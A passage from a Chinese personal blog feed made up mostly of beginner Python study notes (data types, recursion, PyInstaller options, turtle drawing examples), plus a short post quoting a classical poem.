class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br>words = jieba.lcut(txt)<br>counts = &#123;&#125;<br><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(word) == <span class="hljs-number">1</span>:<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>counts[word] = counts.get(word,<span class="hljs-number">0</span>)+<span class="hljs-number">1</span><br><br>items = <span class="hljs-built_in">list</span>(counts.items())<br>items.sort(key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)<br>word,count = items[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;</span>.<span class="hljs-built_in">format</span>(word,count))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python组合数据类型</title>
    <link href="/blog/2018/08/16/Python%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/blog/2018/08/16/Python%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p><strong>今天学习一下Python组合数据类型。</strong><br><img src="/images/fj7.jpg"></p><span id="more"></span><h2 id="集合类型及操作"><a href="#集合类型及操作" class="headerlink" title="集合类型及操作"></a>集合类型及操作</h2><h3 id="集合的定义"><a href="#集合的定义" class="headerlink" title="集合的定义"></a>集合的定义</h3><p><strong>集合是多个元素的无序组合</strong></p><ul><li>集合类型与数学中的集合概念一致</li><li>集合元素之间无序，每一个元素唯一，不存在相同元素</li><li>放入集合中的元素为不可变数据类型</li><li>集合用{}表示，元素 间用逗号分隔</li><li>建立集合类型用{}或者set()</li><li>建立空的集合必须用set()</li></ul><h3 id="集合操作符"><a href="#集合操作符" class="headerlink" title="集合操作符"></a>集合操作符</h3><p>6个基本操作符：</p><p><img src="/images/caozuofu.png"></p><p>关系操作符：判断子集包含关系</p><p>四个增强操作符：</p><p><img src="/images/caozuofu1.png"></p><h3 id="集合处理方法"><a href="#集合处理方法" class="headerlink" title="集合处理方法"></a>集合处理方法</h3><table><thead><tr><th>操作函数或方法</th><th>描述</th></tr></thead><tbody><tr><td>S.add(x)</td><td>如果x不在集合S中，将x增加到S</td></tr><tr><td>S.discard(x)</td><td>移除S中的元素x，如果x不在集合S中，不报错</td></tr><tr><td>S.remove(x)</td><td>移除S中的元素x，如果x不在集合S中，产生KeyError异常</td></tr><tr><td>S.clear()</td><td>移除S中所有元素</td></tr><tr><td>S.pop()</td><td>随机返回一个元素，更新S，若S为空产生KeyError异常</td></tr><tr><td>S.copy()</td><td>返回集合S的一个副本</td></tr><tr><td>len(S)</td><td>返回集合S中的元素个数</td></tr><tr><td>x in S</td><td>判断S中是否含有元素x，若含有返回True，否则返回False</td></tr></tbody></table><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li>包含关系比较</li><li>数据去重：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">ls = [<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-number">123</span>]<br>s = <span class="hljs-built_in">set</span>(ls)<br>lt = <span class="hljs-built_in">list</span>(s)<br></code></pre></td></tr></table></figure></li></ul><h2 id="序列类型及操作"><a href="#序列类型及操作" class="headerlink" title="序列类型及操作"></a>序列类型及操作</h2><h3 id="序列类型定义"><a href="#序列类型定义" class="headerlink" title="序列类型定义"></a>序列类型定义</h3><p><strong>序列是具有先后关系的一组元素。</strong></p><ul><li>序列是一维元素向量，元素类型可以不同</li><li>类似数学元素序列</li><li>元素间由序号引导，通过下标访问特定元素</li></ul><h3 id="序列处理函数及方法"><a href="#序列处理函数及方法" class="headerlink" title="序列处理函数及方法"></a>序列处理函数及方法</h3><p>6个操作符：</p><p><img src="/images/xlczf.png"></p><p>5个函数方法：</p><table><thead><tr><th>函数和方法</th><th>描述</th></tr></thead><tbody><tr><td>len(s)</td><td>返回s的长度</td></tr><tr><td>min(s)</td><td>返回序列s的最小元素，s中元素需要可比较</td></tr><tr><td>max(s)</td><td>返回序列s的最大元素，s中元素需要可比较</td></tr><tr><td>s.index(x)或s.index(x,i,j)</td><td>返回序列s从i开始到j位置中第一次出现元素x的位置</td></tr><tr><td>s.count(x)</td><td>返回序列s中出现x的总次数</td></tr></tbody></table><h3 id="元组类型及操作"><a href="#元组类型及操作" class="headerlink" title="元组类型及操作"></a>元组类型及操作</h3><p>定义：<strong>元组是序列类型的一种扩展</strong></p><ul><li>元组是一种序列类型，一旦创建就不能被修改</li><li>使用小括号或tuple()创建，元素间用逗号分隔</li><li>可以使用或不使用小括号</li><li>继承序列类型全部通用操作</li></ul><h3 id="列表类型及操作"><a href="#列表类型及操作" class="headerlink" title="列表类型及操作"></a>列表类型及操作</h3><p><strong>列表是序列类型的一种扩展，很常用</strong></p><p><img src="/images/lbczf.png"></p><p><img src="/images/lbczf1.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python函数和代码复用(二)</title>
    <link href="/blog/2018/08/15/Python%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A8-%E4%BA%8C/"/>
    <url>/blog/2018/08/15/Python%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A8-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<p><strong>今天继续学习一下Python函数和代码复用。</strong><br><img src="/images/fj6.jpg"></p><span id="more"></span><h2 id="代码复用和函数递归"><a href="#代码复用和函数递归" class="headerlink" title="代码复用和函数递归"></a>代码复用和函数递归</h2><h3 id="代码复用与模块化设计"><a href="#代码复用与模块化设计" class="headerlink" title="代码复用与模块化设计"></a>代码复用与模块化设计</h3><p><strong>代码复用：同一份代码在需要的时间可以被重复使用</strong></p><p>分而治之：</p><ul><li>通过函数或对象封装，将程序划分为模块及模块间的表达</li><li>具体包括：主程序、子程序和子程序之间的关系</li><li>分而治之：一种分而治之、分层抽象、体系化的设计思想</li></ul><p>紧耦合：两部分之间交流很多，无法独立存在<br>松耦合：两部分之间交流较少，可以独立存在</p><p>模块内部尽量紧耦合，模块之间尽量松耦合</p><h3 id="函数递归"><a href="#函数递归" class="headerlink" title="函数递归"></a>函数递归</h3><p>递归的实现：<br>计算n！：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fact</span>(<span class="hljs-params">n</span>):<br><span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> n*fact(n-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>递归实现字符串反转：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rvs</span>(<span class="hljs-params">s</span>):<br><span class="hljs-keyword">if</span> s == <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">return</span> s<br><span class="hljs-keyword">else</span> :<br><span class="hljs-keyword">return</span> rvs(s[<span class="hljs-number">1</span>:])+s[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>斐波那契数列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">n</span>):<br><span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> n == <span class="hljs-number">2</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span> :<br><span class="hljs-keyword">return</span> f(n-<span class="hljs-number">1</span>) + f(n-<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>汉诺塔：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hanoi</span>(<span class="hljs-params">n,src,dst,mid</span>):  <span class="hljs-comment">#src 原来的柱子 dst目的柱子 mid中间过度柱子</span><br><span class="hljs-keyword">global</span> count<br><span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span> :<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;-&gt;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>,src,dst))<br>count +=<span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>hanoi(n-<span class="hljs-number">1</span>,src,mid,dst)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;-&gt;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(n,src,dst))<br>count +=<span class="hljs-number">1</span><br>hanoi(n-<span class="hljs-number">1</span>,mid,dst,src)<br></code></pre></td></tr></table></figure><p><img src="/images/hnt.png"></p><h2 id="Pyinstall库的使用"><a href="#Pyinstall库的使用" class="headerlink" title="Pyinstall库的使用"></a>Pyinstall库的使用</h2><p><strong>概述：将.py源代码转换成无需源代码的可执行文件</strong><br>简单总结PyInstaller使用方法：<br>生成单一的exe文件：<br>pyinstaller -F test.py<br><img src="/images/pyinstaller.png"></p><p>下面对pyinstall库的使用进行详细介绍：</p><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>-F, –onefile</td><td>产生一个文件用于部署 .</td></tr><tr><td>-D, –onedir</td><td>产生一个目录用于部署 (默认)</td></tr><tr><td>-K, –tk</td><td>在部署时包含 TCL&#x2F;TK</td></tr><tr><td>-a, –ascii</td><td>不包含编码.在支持Unicode的python版本上默认包含所有的编码.</td></tr><tr><td>-d, –debug</td><td>产生debug版本的可执行文件</td></tr><tr><td>-w,–windowed,–noconsole</td><td>使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效)</td></tr><tr><td>-c,–nowindowed,–console</td><td>使用控制台子系统执行(默认)(只对Windows有效)</td></tr><tr><td>-s,–strip</td><td>可执行文件和共享库将run through strip.注意Cygwin的strip往往使普通的win32 Dll无法使用.</td></tr><tr><td>-X, –upx</td><td>如果有UPX安装(执行Configure.py时检测),会压缩执行文件(Windows系统中的DLL也会)</td></tr><tr><td>-o DIR, –out&#x3D;DIR</td><td>指定spec文件的生成目录,如果没有指定,而且当前目录是PyInstaller的根目录,会自动创建一个用于输出(spec和生成的可执行文件)的目录.如果没有指定,而当前目录不是PyInstaller的根目录,则会输出到当前的目录下.</td></tr><tr><td>-p DIR, –path&#x3D;DIR</td><td>设置导入路径(和使用PYTHONPATH效果相似).可以用路径分割符(Windows使用分号,Linux使用冒号)分割,指定多个目录.也可以使用多个-p参数来设置多个导入路径</td></tr><tr><td>–icon&#x3D;&lt;FILE.ICO&gt;</td><td>将file.ico添加为可执行文件的资源(只对Windows系统有效)</td></tr><tr><td>–icon&#x3D;&lt;FILE.EXE,N&gt;</td><td>将file.exe的第n个图标添加为可执行文件的资源(只对Windows系统有效)</td></tr><tr><td>-v FILE, –version&#x3D;FILE</td><td>将verfile作为可执行文件的版本资源(只对Windows系统有效)</td></tr><tr><td>-n NAME, –name&#x3D;NAME</td><td>可选的项目(产生的spec的)名字.如果省略,第一个脚本的主文件名将作为spec的名字</td></tr></tbody></table><p>实例：pyinstaller -i curve.ico -F 文件名.py #将图标与程序链接</p><h2 id="科赫小雪花绘图："><a href="#科赫小雪花绘图：" class="headerlink" title="科赫小雪花绘图："></a>科赫小雪花绘图：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> turtle<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">koch</span>(<span class="hljs-params">size, n</span>):<br>    <span class="hljs-keyword">if</span> n== <span class="hljs-number">0</span>:<br>        turtle.fd(size)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> angle <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">60</span>, -<span class="hljs-number">120</span>, <span class="hljs-number">60</span>]:<br>            turtle. left(angle)<br>            koch(size/<span class="hljs-number">3</span>, n-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    turtle.setup(<span class="hljs-number">600</span>, <span class="hljs-number">600</span>)<br>    turtle.penup()<br>    turtle.pencolor(<span class="hljs-string">&quot;pink&quot;</span>)<br>    turtle.speed(<span class="hljs-number">0</span>)<br>    turtle.goto( - <span class="hljs-number">200</span>, <span class="hljs-number">100</span>)<br>    turtle.pendown()<br>    turtle.pensize(<span class="hljs-number">2</span>)<br>    level = <span class="hljs-number">4</span><br>    koch(<span class="hljs-number">400</span> ,level)<br>    turtle. right (<span class="hljs-number">120</span>)<br>    koch(<span class="hljs-number">400</span>,level)<br>    turtle. right(<span class="hljs-number">120</span>)<br>    koch(<span class="hljs-number">400</span>,level)<br>    turtle.hideturtle()<br>main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>木兰词·拟古决绝词柬友</title>
    <link href="/blog/2018/08/10/%E6%9C%A8%E5%85%B0%E8%AF%8D%C2%B7%E6%8B%9F%E5%8F%A4%E5%86%B3%E7%BB%9D%E8%AF%8D%E6%9F%AC%E5%8F%8B/"/>
    <url>/blog/2018/08/10/%E6%9C%A8%E5%85%B0%E8%AF%8D%C2%B7%E6%8B%9F%E5%8F%A4%E5%86%B3%E7%BB%9D%E8%AF%8D%E6%9F%AC%E5%8F%8B/</url>
    
    <content type="html"><![CDATA[<p><strong>人生若只如初见，何事秋风悲画扇。<br>等闲变却故人心，却道故人心易变。<br>骊山语罢清宵半，泪雨零铃终不怨。<br>何如薄幸锦衣郎，比翼连枝当日愿。</strong><br><img src="/images/suibi1.jpg"></p><span id="more"></span><p>这就是我的几乎所有社交账号昵称的来历，不知道什么时候，也忘记了具体因为感慨什么，就喜欢上了这首诗，也喜欢上了“初见”，因为“初见”总是那么美好！</p>]]></content>
    
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python函数和代码复用(一)</title>
    <link href="/blog/2018/08/09/Python%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A8(%E4%B8%80)/"/>
    <url>/blog/2018/08/09/Python%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A8(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<p><strong>今天学习一下Python函数和代码复用，进一步学习python。</strong><br><img src="/images/fj5.jpg"></p><span id="more"></span><h2 id="函数的定义和使用"><a href="#函数的定义和使用" class="headerlink" title="函数的定义和使用"></a>函数的定义和使用</h2><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><p><strong>函数是一段代码的表示</strong></p><ul><li>函数是一段具有特定功能的、可重用的语句组</li><li>函数是一种功能的抽象，一般函数表达特定功能</li><li>两个作用：<strong>降低编程难度</strong>和<strong>代码复用</strong><br>案例：计算n！<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fact</span>(<span class="hljs-params">n</span>):<br>s = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>s *= i<br><span class="hljs-keyword">return</span> s<br></code></pre></td></tr></table></figure></li></ul><h3 id="函数的使用和调用过程"><a href="#函数的使用和调用过程" class="headerlink" title="函数的使用和调用过程"></a>函数的使用和调用过程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fact</span>(<span class="hljs-params">n</span>):<br>s = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>s *= i<br><span class="hljs-keyword">return</span> s<br>a = fact(<span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><h3 id="函数的参数传递"><a href="#函数的参数传递" class="headerlink" title="函数的参数传递"></a>函数的参数传递</h3><p>函数可以有参数，也可以没有，但必须保留括号 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> &lt;函数名&gt;():<br>&lt;函数体&gt;<br><span class="hljs-keyword">return</span> &lt;返回值&gt;<br></code></pre></td></tr></table></figure><p>可选参数传递：函数定义时可以为某些参数指定默认值，构成可选参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> &lt;函数名&gt;(&lt;非可选参数&gt;,&lt;可选参数&gt;):<br>&lt;函数体&gt;<br><span class="hljs-keyword">return</span> &lt;返回值&gt;<br></code></pre></td></tr></table></figure><p>可变参数传递：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> &lt;函数名&gt;(&lt;参数&gt;,*b):<br>&lt;函数体&gt;<br><span class="hljs-keyword">return</span> &lt;返回值&gt;<br></code></pre></td></tr></table></figure><p>实例：计算n！乘数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fact</span>(<span class="hljs-params">n,*b</span>):<br>s = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>s *= i<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> b:<br>s *= item<br><span class="hljs-keyword">return</span> s<br></code></pre></td></tr></table></figure><p>参数传递的两种参数：按位置或者按名称</p><h3 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h3><p>可以返回0个或多个元组类型的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fact</span>(<span class="hljs-params">n,m=<span class="hljs-number">1</span></span>):<br>s = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>):<br>s *= i<br><span class="hljs-keyword">return</span> s//m,n,m<br>a,b,c = fact(<span class="hljs-number">10</span>,<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h3 id="局部变量和全局变量"><a href="#局部变量和全局变量" class="headerlink" title="局部变量和全局变量"></a>局部变量和全局变量</h3><ul><li>局部变量和全局变量是不同变量</li><li>函数中使用全局变量：使用global关键字</li><li>局部变量为组合数据类型且未创建，等同于全局变量</li></ul><h3 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h3><p>&lt;函数名&gt; &#x3D; lambda&lt;参数&gt;:&lt;表达式&gt;<br> f &#x3D; lambda x,y : x+y<br><strong>lambda 函数谨慎使用</strong></p><h2 id="实例：七段数码管绘制"><a href="#实例：七段数码管绘制" class="headerlink" title="实例：七段数码管绘制"></a>实例：七段数码管绘制</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> turtle <span class="hljs-keyword">as</span> t<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drawLine</span>(<span class="hljs-params">draw</span>):  <span class="hljs-comment">#绘制单段数码管</span><br>t.pendown() <span class="hljs-keyword">if</span> draw <span class="hljs-keyword">else</span> t.penup()<br>t.fd(<span class="hljs-number">40</span>)<br>t.right(<span class="hljs-number">90</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drawDigit</span>(<span class="hljs-params">digit</span>):  <span class="hljs-comment">#根据数字绘制七段数码管</span><br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>t.left(<span class="hljs-number">90</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>drawLine(<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> digit <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>] <span class="hljs-keyword">else</span> drawLine(<span class="hljs-literal">False</span>)<br>t.left(<span class="hljs-number">180</span>)<br>t.penup()<br>t.fd(<span class="hljs-number">20</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drawDate</span>(<span class="hljs-params">date</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> date:<br>drawDigit(<span class="hljs-built_in">eval</span>(i))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>t.setup(<span class="hljs-number">800</span>,<span class="hljs-number">350</span>)<br>t.penup()<br>t.fd(-<span class="hljs-number">300</span>)<br>t.pensize(<span class="hljs-number">5</span>)<br>t.pencolor(<span class="hljs-string">&#x27;red&#x27;</span>)<br>drawDate(time.strftime(<span class="hljs-string">&#x27;%Y%m%d&#x27;</span>,time.gmtime()))<br>t.hideturtle()<br>t.done()<br>main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python程序的控制结构</title>
    <link href="/blog/2018/08/06/Python%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84/"/>
    <url>/blog/2018/08/06/Python%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p><strong>今天学习一下python程序的分支和循环结构以及random库的使用。</strong><br><img src="/images/fj4.jpg"></p><span id="more"></span><h2 id="程序的分支结构"><a href="#程序的分支结构" class="headerlink" title="程序的分支结构"></a>程序的分支结构</h2><h3 id="单分支结构"><a href="#单分支结构" class="headerlink" title="单分支结构"></a>单分支结构</h3><p>if &lt;条件&gt; :<br>    &lt;语句块&gt;<br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">guess = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">if</span> guess == <span class="hljs-number">99</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;猜对了&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="二分支结构"><a href="#二分支结构" class="headerlink" title="二分支结构"></a>二分支结构</h3><p>if &lt;条件&gt; :<br>    &lt;语句块1&gt;<br>else:<br>    &lt;语句块2&gt;<br><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">guess = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">if</span> guess == <span class="hljs-number">99</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;猜对了&quot;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;猜错了&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="多分支结构"><a href="#多分支结构" class="headerlink" 